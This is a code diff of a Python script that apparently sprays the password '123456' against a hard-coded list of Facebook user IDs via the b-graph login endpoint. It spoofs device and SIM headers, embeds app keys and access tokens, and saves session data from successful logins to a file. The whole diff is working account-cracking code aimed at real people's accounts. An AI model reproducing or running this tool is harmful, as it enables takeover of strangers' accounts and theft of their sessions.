@@ -439,106 +439,92 @@ for i in range(2000):
         pass
 
 # _______[ B-API CRACK - FILE ]_____>>
-def bapif(uid, pwx):
-    total = 1
-    global oks, cps
-    global ualist
-    global cracked
-
+def bapif(uid):
+    print(f"\r{rad}[Start] {uid} | {pw} {white}")
     try:
-        for pw in pwx:
-            pw = "123456"
-            useragent = random.choice(ualist)
-            adid = uuid.uuid4()
-            device_id = uuid.uuid4()
-            family_device_id = uuid.uuid4()
-            sim = str(random.randint(11111, 99999))
-            xfb_device = str(random.randint(1111, 9999))
-            dataX = {
-                "adid": adid,
-                "format": "json",
-                "device_id": device_id,
-                "email": uid,
-                "password": pw,
-                "generate_analytics_claims": "1",
-                "community_id": "",
-                "cpl": "true",  # 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
-                "try_num": "1",  # 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
-                "family_device_id": family_device_id,
-                "credentials_type": "password",
-                "source": "login",
-                "error_detail_type": "button_with_disabled",
-                "enroll_misauth": "false",
-                "generate_session_cookies": "1",
-                "generate_machine_id": "1",
-                "currently_logged_in_userid": "0",
-                "locale": 'en_US"',
-                "client_country_code": "US",
-                "fb_api_req_friendly_name": "authenticate",
-                "api_key": "fc0a7caa49b192f64f6f5a6d9643bb28",
-                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-            }
-            headersX = {
-                "User-Agent": useragent,
-                "Accept-Encoding": "gzip, deflate",
-                "Connection": "close",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Host": "graph.facebook.com",
-                "X-FB-Net-HNI": sim,
-                "X-FB-SIM-HNI": sim,
-                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-                "X-FB-Connection-Type": "WIFI",
-                "X-Tigon-Is-Retry": "False",
-                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=fc0a7caa49b192f64f6f5a6d9643bb28",
-                "x-fb-device-group": "5120",
-                "X-FB-Friendly-Name": "ViewerReactionsMutation",
-                "X-FB-Request-Analytics-Tags": "graphservice",
-                "X-FB-HTTP-Engine": "Liger",
-                "X-FB-Client-IP": "True",
-                "X-FB-Server-Cluster": "True",
-                "x-fb-connection-token": "62f8ce9f74b12f84c123cc23437a4a32",
-            }
-            responce = requests.post(
-                "https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true",
-                data=dataX,
-                headers=headersX,
-                allow_redirects=False,
-            ).text
-            responce_json = json.loads(responce)
-            file_name = "res.txt"
-            if "session_key" in responce_json:
-                print(responce_json)
-                try:
-                    with open(file_name, "a", encoding="utf-8") as file:
-                        json_string = json.dumps(responce_json, ensure_ascii=False)
-                        file.write(json_string + "\n")
-                    print(f"Đã lưu nội dung JSON vào file '{file_name}' trên dòng mới.")
-                except IOError as e:
-                    print(f"Lỗi khi ghi file: {e}")
-                except Exception as e:
-                    print(f"Đã xảy ra lỗi: {e}")
+        pw = "123456"
+        useragent = random.choice(ualist)
+        adid = uuid.uuid4()
+        device_id = uuid.uuid4()
+        family_device_id = uuid.uuid4()
+        sim = str(random.randint(11111, 99999))
+        xfb_device = str(random.randint(1111, 9999))
+        dataX = {
+            "adid": adid,
+            "format": "json",
+            "device_id": device_id,
+            "email": uid,
+            "password": pw,
+            "generate_analytics_claims": "1",
+            "community_id": "",
+            "cpl": "true",  # 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
+            "try_num": "1",  # 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
+            "family_device_id": family_device_id,
+            "credentials_type": "password",
+            "source": "login",
+            "error_detail_type": "button_with_disabled",
+            "enroll_misauth": "false",
+            "generate_session_cookies": "1",
+            "generate_machine_id": "1",
+            "currently_logged_in_userid": "0",
+            "locale": 'en_US"',
+            "client_country_code": "US",
+            "fb_api_req_friendly_name": "authenticate",
+            "api_key": "fc0a7caa49b192f64f6f5a6d9643bb28",
+            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+        }
+        headersX = {
+            "User-Agent": useragent,
+            "Accept-Encoding": "gzip, deflate",
+            "Connection": "close",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Host": "graph.facebook.com",
+            "X-FB-Net-HNI": sim,
+            "X-FB-SIM-HNI": sim,
+            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+            "X-FB-Connection-Type": "WIFI",
+            "X-Tigon-Is-Retry": "False",
+            "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=fc0a7caa49b192f64f6f5a6d9643bb28",
+            "x-fb-device-group": "5120",
+            "X-FB-Friendly-Name": "ViewerReactionsMutation",
+            "X-FB-Request-Analytics-Tags": "graphservice",
+            "X-FB-HTTP-Engine": "Liger",
+            "X-FB-Client-IP": "True",
+            "X-FB-Server-Cluster": "True",
+            "x-fb-connection-token": "62f8ce9f74b12f84c123cc23437a4a32",
+        }
+        responce = requests.post(
+            "https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true",
+            data=dataX,
+            headers=headersX,
+            allow_redirects=False,
+        ).text
+        responce_json = json.loads(responce)
+        file_name = "res.txt"
+        if "session_key" in responce_json:
+            print(responce_json)
+            try:
+                with open(file_name, "a", encoding="utf-8") as file:
+                    json_string = json.dumps(responce_json, ensure_ascii=False)
+                    file.write(json_string + "\n")
+                print(f"Đã lưu nội dung JSON vào file '{file_name}' trên dòng mới.")
+            except IOError as e:
+                print(f"Lỗi khi ghi file: {e}")
+            except Exception as e:
+                print(f"Đã xảy ra lỗi: {e}")
 
-                if uid not in oks:
-                    print(f"\r{green}[OK] {uid} | {pw} {white}")
-                    oks.append(uid)
-            elif responce_json["error"]["code"] == 405:
-                if uid not in cps:
-                    print(f"\r{rad}[CP] {uid}     | {pw} {white}")
-                    cps.append(uid)
-            else:
-                continue
-        cracked.append(uid)
+            print(f"\r{green}[OK] {uid} | {pw} {white}")
     except requests.exceptions.ConnectionError:
         time.sleep(10)
     except Exception as e:
         print(e)
+    print(f"\r{rad}[End] {uid} | {pw} {white}")
 
 
 if __name__ == "__main__":
-    print("Script read kro lol")
+    print("Start check")
     uids = [
         "100004991347420",
-"100004522053735",
 "100004059917853",
 "100004398215253",
 "100004034666354",
@@ -579,7 +565,6 @@ if __name__ == "__main__":
 "100004646889275",
 
     ]
-    pwd = "123456"
     for i in uids:
-
-        bapif(i, pwd)
+        bapif(i)
+    print("End check")
